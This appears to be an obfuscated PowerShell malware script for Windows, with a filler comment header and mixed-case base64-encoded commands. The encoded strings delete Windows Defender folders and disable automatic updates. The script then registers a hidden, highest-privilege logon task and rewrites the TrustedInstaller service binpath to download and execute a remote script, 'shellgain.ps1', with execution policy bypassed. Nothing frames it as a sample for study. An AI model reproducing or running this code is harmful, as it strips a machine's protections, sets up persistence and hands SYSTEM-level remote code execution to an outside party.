<#
    .SYNOPSIS
    .SYNOPSIS
    .SYNOPSIS
    .SYNOPSIS
    .SYNOPSIS
#> # g
         

                [tEXt.eNcOdInG]::uNiCODe.gEtstRiNg([cOnVErt]::fRoMBaSe64sTrINg("cmVNT3ZFLWlURW0gJ0M6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlcicKckVNb1ZlLWlURW0gJ0M6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlciBBZHZhbmNlZCBUaHJlYXQgUHJvdGVjdGlvbic="))
    $taskName = "MyScheduledTask"
                $command = "sc.exe start TrustedInstaller"
            $trigger = New-ScheduledTaskTrigger -AtLogOn
                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -C $command"
        Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -RunLevel Highest -Force
        [tEXt.eNcOdInG]::uNiCODe.gEtstRiNg([cOnVErt]::fRoMBaSe64sTrINg("U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcV2luZG93c1VwZGF0ZVxBVSIgLU5hbWUgIk5vQXV0b1VwZGF0ZSIgLVZhbHVlIDEKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcV2luZG93c1VwZGF0ZSIgLU5hbWUgIkFVT3B0aW9ucyIgLVZhbHVlIDE="))
sc.exe config TrustedInstaller binpath = "Powershell -W h -Ep bypass -Noninteractive -NoP -NoL -C 'irm https://raw.githubusercontent.com/bananamansot/lmao/main/shellgain.ps1 | iex'"
    